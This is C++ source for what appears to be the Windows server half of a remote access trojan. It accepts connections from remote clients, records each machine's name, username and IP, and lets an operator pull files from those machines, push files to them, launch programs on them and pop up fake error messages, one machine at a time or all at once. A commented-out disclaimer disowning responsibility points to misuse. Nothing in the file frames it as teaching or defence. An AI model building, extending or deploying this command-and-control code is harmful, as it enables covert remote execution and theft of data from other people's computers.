#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <string>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <vector>
#include <thread>
#include <map>
#include <stdlib.h>
#pragma comment(lib, "ws2_32.lib")
std::vector <std::pair<SOCKET, sockaddr_in>> clientsock;
std::map<SOCKET, std::string> name;
std::map <SOCKET, std::string> username;
long long connection_limit;
long long current = -1;
std::string to_print;
int printer();
void socket_cleaner(SOCKET sock) {
    char c = 'c';
    while(clientsock.size()) {
        
        send(sock, (char*) & c, 1, 0);
        closesocket(clientsock[0].first);
        clientsock.erase(clientsock.begin());
    }
}
bool able_to_clean = true;
void cleaner() {
    while (true) {
        for (int i = 0; i < clientsock.size(); i++)
        {
            while (!able_to_clean) Sleep(1);
            char s = 'p';
            send(clientsock[i].first, (char*)&s, sizeof(char), 0);
            char st [5] = "____";
            recv(clientsock[i].first, (char*)&st, 5, 0);
            
            if (strcmp(st, "pong") && able_to_clean) {
                
                closesocket(clientsock[i].first);
                clientsock.erase(clientsock.begin()+i);
                
                std::cout << "\nDisconnected:" << i << std::endl;
            }
            
        }
        Sleep(1000);
    }
}
void accepter(SOCKET sock ) {
beg:
    while (clientsock.size() == connection_limit) Sleep(1);
    while (connection_limit != clientsock.size()) {
        sockaddr_in cl_params;
        int cfg_size = sizeof(cl_params);
        SOCKET cl_sock = accept(sock, (sockaddr*)&cl_params, &cfg_size);
       
        clientsock.push_back(std::pair<SOCKET, sockaddr_in>(cl_sock, cl_params));


        char get_name[100];
        recv(clientsock.back().first, (char*)&get_name, 100, 0);
        char get_username[64];
        recv(clientsock.back().first,(char*)&get_username, 64, 0 );
        std::string n;
        n = get_name;
        name[clientsock.back().first] = n;
        n = get_username;
        username[clientsock.back().first] = n;

    }
    goto beg;
}

int printer() {
    using namespace std;
    system("cls");
    system("color 02");
    if (clientsock.size() == 0) {
        current = -1;
        std::cout << "LIST IS EMPTY";
        return 1;
    }
    
    std::cout << "ID\tCOMPUTER NAME\t\tUSERNAME\t\tIP\n";
    for (int i = 0; i < clientsock.size(); i++) {
        char ip[50];
        inet_ntop(AF_INET, &clientsock[i].second.sin_addr, ip, 50);
        std::cout << i << ":\t" << name[clientsock[i].first] << "\t\t" << username[clientsock[i].first] << "\t\t" << ip << endl;
    }
    std::cout << to_print;
    return 0;
}
int main()
{
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    using namespace std;
   // std::cout << "Disclaimer\n" << "The creator is not responsible for your actions\n";
   // Sleep(10000);
 //   system("cls");
    WSADATA wsdata;
    if (WSAStartup(MAKEWORD(2, 2), &wsdata)) {
        std::cout << "WSAStartup error:" << WSAGetLastError() << endl;
        WSACleanup();
        system("pause");
        return 1;
    }
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in config;
    char* ip = new char[256];
    u_short port;
    std::cout << "Write ip:";
    cin >> ip;
    std::cout << "Write port:";
    cin >> port;
    std::cout << "Write connection limit" << endl;
    cin >> connection_limit;
    config.sin_port = htons(port);
    config.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &config.sin_addr);
    if (bind(sock, (sockaddr*)&config, sizeof(config))) {
        std::cout << "BINDING error:" << WSAGetLastError() << endl;
        WSACleanup();
        closesocket(sock);
        system("pause");
        return 2;
    }
    std::cout << "Binded succesfull!\n";
    if (listen(sock, connection_limit)) {
        std::cout << "Listening error:" << WSAGetLastError() << endl;
        WSACleanup();
        closesocket(sock);
        system("pause");
        return 3;
    }
    
    
    SOCKET clsock;
    thread th2(cleaner);
    thread th(accepter, sock);
    th.detach();
    th2.detach();
    string directory = "C:\\";
    while (1) {
        able_to_clean = true;
        while (printer()) { Sleep(5000); }
       out_of_cycle:
       if(current == -1) {
           ret:
           cin >> current;
           if (current == -1) continue;
           else if (current == -2) goto out_of_cycle;
           if (current < 0 || current > clientsock.size()-1) {
               std::cout << "invalid client!\n";
               goto ret;
           }
           clsock = clientsock[current].first;
       }
       
       std::cout << "Current client:" << current << endl;
       string command;
       std::cout << directory << ">";
       cin >> command;
       to_print = "";
       able_to_clean = false;
       if (current == -1) continue;
       char cmd;
       if (current == -2) {
           char buff[256];

           char cap[20];
           char* path1 = new char[1024], * path2 = new char[1024];
           size_t buffersize;
           if (command == "send") {
               cin >> buffersize;
               cin.get();
               cin.getline(path1, 1024);
               if (current == -1) continue;
               cin.getline(path2, 1024);
               if (current == -1) continue;
           }
           else if (command == "get") {
               cin >> buffersize;
               cin.get();
               cin.getline(path1, 1024);
               if (current == -1) continue;
               cin.getline(path2, 1024);
               if (current == -1) continue;
           }
           else if (command == "err") {
               cin.get();
               cin.getline(cap, 20);
               if (current == -1) continue;
               cin.getline(buff, 256);
               if (current == -1) continue;
           }
           else if (command == "run") {
               cin.get();
               cin.getline(buff, 256);
           }
           for (long long i = 0; i < clientsock.size(); i++) {
               clsock = clientsock[i].first;
               
               
               if (command == "send") {
                   cmd = 'f';
                   send(clsock, (char*)&cmd, 1, 0);
                   
                   
                   if (current == -1) continue;
                   send(clsock, (char*)&buffersize, sizeof(buffersize), 0);
                   char* buffer = new char[buffersize];
                   
                  
                   send(clsock, (char*)path2, 1024, 0);
                   DWORD iRead = 0;
                   HANDLE FILE = CreateFileA(path1, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                   //unsigned long pack = 0;
                   while (ReadFile(FILE, buffer, buffersize, &iRead, NULL) && iRead > 0) {
                       send(clsock, (char*)&iRead, sizeof(DWORD), 0);
                       send(clsock, buffer, iRead, 0);

                       //std::cout << ++pack <<  " " << iRead <<endl;

                   }
                   send(clsock, (char*)&iRead, sizeof(DWORD), 0);
                   CloseHandle(FILE);
                   delete[]path1;
                   delete[]path2;
                   delete[]buffer;
                   std::cout << "DONE!\n";
               }
               else if (command == "change") {
                   directory = "C:\\";
                   to_print = "";
                   current = -1;
               }
               else if (command == "get") {
                   cmd = 'g';
                   send(clsock, (char*)&cmd, 1, 0);
                   
                   if (current == -1) continue;
                   send(clsock, (char*)&buffersize, sizeof(buffersize), 0);
                   char* buffer = new char[buffersize];
                   
                   
                   send(clsock, (char*)path1, 1024 * sizeof(char), 0);
                   DWORD iRead = 0;
                   DWORD iWritten = 0;
                   DWORD total = 0;
                   recv(clsock, (char*)&iRead, sizeof(DWORD), 0);
                   HANDLE file = CreateFileA(path2, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                   unsigned long pack = 0;
                   while (iRead > 0) {
                       recv(clsock, buffer, buffersize, MSG_WAITALL);
                       WriteFile(file, buffer, iRead, &iWritten, NULL);
                       total += iWritten;

                       recv(clsock, (char*)&iRead, sizeof(DWORD), MSG_WAITALL);
                   }

                   CloseHandle(file);
                   delete[]buffer;
                   delete[]path1;
                   delete[]path2;
               }
               else if (command == "err") {
                   cmd = 'e';
                   send(clsock, (char*)&cmd, 1, 0);
                   
                   
                   send(clsock, cap, 20, 0);
                   send(clsock, buff, 256, 0);

                   continue;
               }
               else if (command == "c" || command == "close") {
                   cmd = 'c';
                   send(clsock, (char*)&cmd, 1, 0);
                   WSACleanup();
                   socket_cleaner(sock);
                   closesocket(sock);

                   break;
               }
               else if (command == "run") {
                   cmd = 'r';
                   send(clsock, (char*)&cmd, 1, 0);
                   
                   
                   if (current == -1) continue;
                   send(clsock, buff, 256, 0);
               }
               else if (command == "c" || command == "close") {
                   cmd = 'c';


                   socket_cleaner(sock);
                   WSACleanup();
                   closesocket(sock);
               }
              /* else if (command == "dir" || command == "ls") {
                   cmd = 'd';
                   send(clsock, (char*)&cmd, 1, 0);
                   char path[1024] = "";
                   for (int i = 0; i < directory.size(); i++) {
                       path[i] = directory[i];
                   }path[directory.size()] = '\0';
                   send(clsock, (char*)&path, 1024, 0);

                   char buff[512] = "";
                   recv(clsock, (char*)&buff, 512, MSG_WAITALL);
                   while (strcmp(buff, "\\StreamEnd")) {

                       std::cout << buff << std::endl;
                       to_print += buff;
                       to_print += '\n';
                       recv(clsock, (char*)&buff, 512, MSG_WAITALL);
                   }
               }
                   else if (command == "cd") {
                       char f[512];
                       ss.get();
                       ss.getline(f, 512);
                       directory += f;
                       directory += "\\";
                   }

                   else if (command == "drivechange") {
                       ss >> directory;
                   }
                   else if (command == "exit_directory") {
                       directory = "C:\\";
                   }
                */
               else {
                   std::cout << "UNKNOWN COMMAND!\n";
               }
           }
           current = -1;
           continue;
       }
       if (command == "send") {
           cmd = 'f';
           send(clsock, (char*)&cmd, 1, 0);
           size_t buffersize;
           cin >> buffersize;
           if (current == -1) continue;
           send(clsock, (char*)&buffersize, sizeof(buffersize), 0);
           char *buffer = new char[buffersize];
           char *path1 = new char[256], *path2 = new char[256];
           cin.get();
           cin.getline(path1, 256);
           if (current == -1) continue;
           cin.getline(path2, 256);
           if (current == -1) continue;
           send(clsock, (char*)path2, 256*sizeof(char), 0);
           DWORD iRead = 0;
           HANDLE FILE = CreateFileA(path1, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
          //unsigned long pack = 0;
           while (ReadFile(FILE, buffer, buffersize, &iRead, NULL) && iRead > 0 ) {
               send(clsock, (char*)&iRead, sizeof(DWORD), 0);
               send(clsock, buffer, iRead, 0);
              
               //std::cout << ++pack <<  " " << iRead <<endl;
               
           }
           send(clsock, (char*)&iRead, sizeof(DWORD), 0);
           CloseHandle(FILE);
           delete[]path1;
           delete[]path2;
           delete[]buffer;
           std::cout << "DONE!\n";
       }
       else if (command == "change") {
           directory = "C:\\";
           to_print = "";
           current = -1;
       }
       else if (command == "get") {
           cmd = 'g';
           send(clsock, (char*)&cmd, 1, 0);
           size_t buffersize;
           cin >> buffersize;
           if (current == -1) continue;
           send(clsock, (char*)&buffersize, sizeof(buffersize), 0);
           char* buffer = new char[buffersize];
           char* path1 = new char[1024], * path2 = new char[1024];
           cin.get();
           cin.getline(path1, 1024);
           if (current == -1) continue;
           cin.getline(path2, 1024);
           if (current == -1) continue;
           send(clsock, (char*)path1, 1024 * sizeof(char), 0);
           DWORD iRead = 0;
           DWORD iWritten = 0;
           DWORD total = 0;
           recv(clsock, (char*)&iRead, sizeof(DWORD), 0);
           HANDLE file = CreateFileA(path2, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
           unsigned long pack = 0;
           while (iRead > 0) {
               recv(clsock, buffer, buffersize, MSG_WAITALL);
               WriteFile(file, buffer, iRead, &iWritten, NULL);
               total += iWritten;
               
               recv(clsock, (char*)&iRead, sizeof(DWORD), MSG_WAITALL);
           }
           
           CloseHandle(file);
           delete[]buffer;
           delete[]path1;
           delete[]path2;
       }
       else if(command == "err") {
           cmd = 'e';
           send(clsock, (char*)&cmd, 1, 0);
           char buff[256];
           
           char cap[20];
           cin.get();
           cin.getline(cap, 20);
           if (current == -1) continue;
           cin.getline(buff, 256);
           if (current == -1) continue;
           send(clsock, cap, 20, 0);
           send(clsock, buff, 256, 0);
           
           continue;
       }
       else if(command == "c" || command == "close") {
           cmd = 'c';
           
           
           socket_cleaner(sock);
           WSACleanup();
           closesocket(sock);
       }
       else if (command == "run") {
           cmd = 'r';
           send(clsock, (char*)&cmd, 1, 0);
           char* path = new char[256];
           cin.get();
           cin.getline(path, 256);
           if (current == -1) continue;
           send(clsock, path, 256, 0);
       }
       /*
       else if (command == "dir" || command == "ls") {
            cmd = 'd';
            send(clsock, (char*)&cmd, 1, 0);
            char path[1024] = "";
            for (int i = 0; i < directory.size(); i++) {
                path[i] = directory[i];
            }path[directory.size()] = '\0';
            send(clsock, (char*)&path, 1024, 0);

            char buff[512] = "";
            recv(clsock, (char*)&buff, 512, MSG_WAITALL);
            while(strcmp(buff, "\\StreamEnd")){
                
                std::cout << buff << std::endl;
                to_print += buff;
                to_print += '\n';
                recv(clsock, (char*)&buff, 512, MSG_WAITALL);
            }
       }
       else if (command == "cd") {
            char f[512];
            cin.get();
            cin.getline(f, 512);
            directory += f;
            directory += "\\";
       }
       
       else if (command == "drivechange") {
            cin >> directory;
       }
       else if (command == "exit_directory") {
            directory = "C:\\";
       }
       */
       else {
           std::cout << "UNKNOWN COMMAND!\n";
       }
       

    }
    delete[]ip;
    return 0;
}

